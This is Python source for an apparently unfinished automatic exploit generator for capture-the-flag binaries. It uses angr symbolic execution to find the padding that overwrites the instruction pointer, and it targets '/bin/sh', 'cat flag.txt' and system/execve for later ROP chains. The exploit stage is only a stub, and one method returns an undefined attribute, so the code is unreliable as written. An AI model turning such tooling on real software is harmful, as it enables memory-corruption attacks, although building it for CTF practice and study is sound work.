import angr
import claripy
import os
import logging
import argparse

from pwn import *


class rAEG:
    def __init__(self, binary_path):
        self.binary = binary_path
        self.elf = ELF(binary_path)

        self.strings =  ['/bin/sh', '/bin/cat flag.txt', 'flag.txt']
        self.exploit_functions = ['win', 'system', 'execve', 'syscall']

        self.proj = angr.Project(binary_path, load_options={'auto_load_libs':False})
        self.loader = self.proj.loader
        start_addr = self.loader.find_symbol('main').rebased_addr

        # Maybe change to symbolic file stream
        self.symbolic_input = claripy.BVS("input", 8 * 600)
        self.symbolic_padding = None

        self.state = self.proj.factory.blank_state(
                addr=start_addr,
                stdin=self.symbolic_input
        )
        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
        self.simgr.stashes['mem_corrupt'] = []

    # Change from CCCC to be address of first rop gadget
    def check_mem_corruption(self, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCCCCCC"]):
                    path.add_constraints(path.regs.pc == b"CCCCCCCC")

                    if path.satisfiable():
                        simgr.stashes['mem_corrupt'].append(path)
                        stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                        index = stack_smash.index(b'CCCCCCCC')
                        self.symbolic_padding = stack_smash[:index]
                        log.info("[+] Found symbolic padding: {}".format(self.symbolic_padding))
                        log.info("[+] Takes {} bytes to smash the instruction pointer".format(len(self.symbolic_padding)))
                    simgr.stashes['unconstrained'].remove(path)
                    simgr.drop(stash='active')

        return simgr

    def stack_smash(self):
        log.info("[+] Smashing the stack")
        self.simgr.explore(step_func=self.check_mem_corruption)
        return self.symbolic_buffer

    def find_exploit(self):
        return None

    def generate_rop_chain(self):
        self.stack_smash()
   


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        prog = "RageAgainstTheMachine",
        description = "An automatic exploit generator using angr, ROPgadget, and pwntools" 
    )
    parser.add_argument("bin", help="path of binary to exploit")
    #parser.add_argument("libc", help="path of libc shared object")
    args = parser.parse_args()

    solver = rAEG(args.bin)
    solver.generate_rop_chain()
